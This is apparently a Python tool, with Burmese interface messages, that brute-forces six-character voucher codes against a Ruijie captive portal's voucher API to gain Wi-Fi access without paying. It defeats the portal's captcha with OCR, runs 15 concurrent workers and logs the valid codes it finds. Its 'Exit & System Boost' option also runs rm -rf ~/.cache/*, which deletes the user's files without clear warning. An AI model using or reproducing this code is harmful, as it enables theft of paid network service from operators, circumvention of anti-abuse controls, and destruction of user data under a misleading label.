import concurrent.futures
import datetime
import gc
import os
import random
import string
import sys
import time
import httpx
import cv2
import ddddocr
import numpy as np
import re as import_re
import asyncio

# ====================================================
# 🌟 RUIJIE ELITE SUITE [AUTO-CONNECTION & GATEKEEPER v9.1]
# ====================================================

C_CYAN = "\033[96m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_MAGENTA = "\033[95m"
C_RED = "\033[91m"
C_WHITE = "\033[97m"
C_RESET = "\033[0m"
C_BOLD = "\033[1m"

def clear_screen():
    print("\033[H\033[J", end="")

def banner():
    print(f"{C_CYAN}{C_BOLD}╔══════════════════════════════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v9.1 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
    print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ Wi-Fi Gatekeeper & Wifidog Engine ]      {C_CYAN}{C_BOLD}║{C_RESET}")
    print(f"{C_CYAN}{C_BOLD}╚══════════════════════════════════════════════════╝{C_RESET}")

# --- OCR & Captcha Helpers ---
_ocr = None
def get_ocr():
    global _ocr
    if _ocr is None:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = get_ocr()
    if ocr is None:
        return None
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        return ocr.classification(buffer.tobytes()).upper()
    except:
        return None

async def verify_wifi_connection():
    """Wi-Fi Portal နှင့် အမှန်တကယ် ချိတ်ဆက်ထားခြင်း ရှိမရှိ စစ်ဆေးခြင်း"""
    print(f"\n{C_YELLOW}⚙️ [Gatekeeper] Checking Wi-Fi Captive Portal connection...{C_RESET}")
    test_urls = [
        "http://portal-mm-as.ruijienetworks.com/api/auth/wifidog",
        "http://192.168.1.1",
        "http://192.168.8.1"
    ]
    
    async with httpx.AsyncClient(timeout=4.0, follow_redirects=True) as client:
        for url in test_urls:
            try:
                resp = await client.get(url)
                final_url = str(resp.url)
                # Portal လိပ်စာ သို့မဟုတ် Captive portal တုံ့ပြန်မှုကို တွေ့ရှိပါက
                if "portal" in final_url or "stage=portal" in final_url or resp.status_code < 500:
                    print(f"{C_GREEN} ✅ Connected! Active Portal Found: {final_url}{C_RESET}")
                    return final_url
            except Exception:
                continue
                
    print(f"{C_RED} ❌ Wi-Fi Portal သို့ ချိတ်ဆက်ထားခြင်း မရှိပါ (သို့မဟုတ်) လိပ်စာ ရှာမတွေ့ပါ။{C_RESET}")
    print(f"{C_RED} ⚠️ Wi-Fi ချိတ်ဆက်ပြီးမှသာ Voucher ရှာဖွေခွင့် ပြုမည်ဖြစ်သည်။{C_RESET}")
    return None

async def get_session_id(client, session_url):
    try:
        if 'sessionId=' in session_url:
            match = import_re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', session_url)
            if match:
                return match.group(1)
        resp = await client.get(session_url, follow_redirects=True, timeout=10.0)
        final_url = str(resp.url)
        match = import_re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', final_url)
        if match:
            return match.group(1)
        text = resp.text
        html_match = import_re.search(r"sessionId['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9]+)['\"]", text)
        if html_match:
            return html_match.group(1)
    except Exception:
        pass
    return None

async def verify_and_check(session_url, code):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
            session_id = await get_session_id(client, session_url)
            if not session_id:
                return False
            
            cap_url = f"https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={session_id}&_t={time.time()}"
            cap_resp = await client.get(cap_url)
            if cap_resp.status_code != 200:
                return False
            
            auth_text = await asyncio.to_thread(_ocr_sync, cap_resp.content)
            if not auth_text:
                return False
            
            verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
            v_resp = await client.post(verify_url, json={'sessionId': session_id, 'authCode': auth_text})
            if v_resp.status_code != 200 or not v_resp.json().get("success"):
                return False
            
            payload = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_text
            }
            resp = await client.post(post_url, json=payload, headers=headers)
            res_text = resp.text
            if 'logonUrl' in res_text or 'success' in res_text.lower():
                return True
    except Exception:
        pass
    return False

def save_code(code):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("valid_codes.txt", "a") as f:
        f.write(f"[{timestamp}] CODE: {code}\n")

def terminal_scanner(portal_url):
    print(f"\n{C_GREEN}🚀 [Scanner Active] Pure Random Wifidog Engine{C_RESET}\n")
    print(f"{C_CYAN}--------------------------------------------------{C_RESET}")
    
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    found_count = 0
    scanned_count = 0
    start_time = time.time()

    async def async_worker():
        nonlocal scanned_count, found_count
        while True:
            code = ''.join(random.choices(chars, k=6))
            scanned_count += 1
            
            elapsed = time.time() - start_time
            speed = scanned_count / elapsed if elapsed > 0 else 0
            sys.stdout.write(f"\r{C_CYAN}[Checking: {code}] | Speed: {speed:.1f} req/s | Found: {found_count}{C_RESET}   ")
            sys.stdout.flush()

            is_valid = await verify_and_check(portal_url, code)
            if is_valid:
                print(f"\n\n{C_GREEN}{C_BOLD}✨ [BINGO! VALID CODE FOUND] ➔ {code}{C_RESET}")
                save_code(code)
                found_count += 1

    async def main_loop():
        tasks = [asyncio.create_task(async_worker()) for _ in range(15)]
        await asyncio.gather(*tasks)

    try:
        asyncio.run(main_loop())
    except KeyboardInterrupt:
        print(f"\n\n{C_RED}⚠️ [Warning] Scan stopped by user.{C_RESET}")

def system_boost_and_exit():
    print(f"\n{C_YELLOW}⚙️ [Boosting System] Cleaning up RAM and cache...{C_RESET}")
    gc.collect()
    try:
        os.system("rm -rf ~/.cache/* 2>/dev/null")
    except Exception:
        pass
    time.sleep(0.5)
    print(f"{C_GREEN}✨ [Success] System optimized and memory freed!{C_RESET}")
    sys.exit(0)

def main_menu():
    active_portal = ""
    while True:
        clear_screen()
        banner()
        print(f"{C_WHITE}┌──────────────────────────────────────────────────┐{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [1] 🔗 Auto-Connect & Verify Wi-Fi Portal       {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [2] ⚡ Start Pure Random Voucher Scanner        {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [3] 📂 View Saved Valid Codes Archive           {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [4] 🧹 Clear Saved Codes History                {C_RESET}│{C_RESET}")
        print(f"{C_WHITE}│{C_CYAN}  [5] 🚀 Exit & System Boost                      {C_WHITE}│{C_RESET}")
        print(f"{C_WHITE}└──────────────────────────────────────────────────┘{C_RESET}")
        
        if active_portal:
            print(f"{C_GREEN} 📌 Status: CONNECTED ({active_portal[:35]}...){C_RESET}")
        else:
            print(f"{C_RED} ⚠️ Status: NOT CONNECTED TO PORTAL YET{C_RESET}")
        
        choice = input(f"{C_MAGENTA}{C_BOLD} ⚡ Select Option [1-5] ➔ {C_WHITE}").strip()
        
        if choice == '1':
            active_portal = asyncio.run(verify_wifi_connection())
            input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")
        elif choice == '2':
            if not active_portal:
                print(f"\n{C_RED} ❌ [Error] Wi-Fi Portal သို့ မချိတ်ဆက်ရသေးပါ။{C_RESET}")
                print(f"{C_RED} ⚠️ ကျေးဇူးပြု၍ ဦးစွာ Option [1] ကိုနှိပ်ပြီး Portal ချိတ်ဆက်မှုကို အတည်ပြုပါ!{C_RESET}")
            else:
                terminal_scanner(active_portal)
            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
        elif choice == '3':
            try:
                with open("valid_codes.txt", "r") as f:
                    print(f"\n{C_GREEN}╔══════════════════════════════════════════════════╗{C_RESET}")
                    print(f"{C_GREEN}║             📂 SECURE ARCHIVE LOG                ║{C_RESET}")
                    print(f"{C_GREEN}╚══════════════════════════════════════════════════╝{C_RESET}")
                    print(f"{C_WHITE}{f.read()}{C_RESET}")
            except FileNotFoundError:
                print(f"\n{C_YELLOW}📂 [Info] Archive is currently empty.{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
        elif choice == '4':
            try:
                open("valid_codes.txt", "w").close()
                print(f"\n{C_GREEN}🧹 [Success] History cleared completely.{C_RESET}")
            except Exception:
                print(f"\n{C_RED}❌ [Error] Failed to clear history.{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
        elif choice == '5':
            system_boost_and_exit()
        else:
            print(f"\n{C_RED}❌ [Error] Invalid option!{C_RESET}")
            input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")

if __name__ == "__main__":
    main_menu()
